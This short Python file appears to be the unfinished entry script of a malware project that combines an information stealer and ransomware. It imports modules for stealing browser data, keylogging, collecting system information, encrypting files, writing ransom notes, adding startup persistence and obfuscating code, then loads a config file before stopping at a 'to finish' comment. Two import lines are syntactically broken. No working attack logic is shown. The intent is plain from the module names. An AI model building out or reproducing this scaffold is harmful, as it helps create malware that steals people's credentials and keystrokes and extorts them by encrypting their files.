import os
import sys import time 
import threading 
import ctypes
import json
from stealer.browser_stealer import stealer_browser_data 
from stealer.keylogger import start_keylogger
from stealer.system_info import get_system_info
from ransomware.encryption import encrypt_files
from ransomware.ransom.note import generate_ransom_note
from utils.persistence import add_to_startup
from utils.obfuscator importobfuscate_code

with open("config.json", "r") as f:
  config = json.load(f)
#a finir
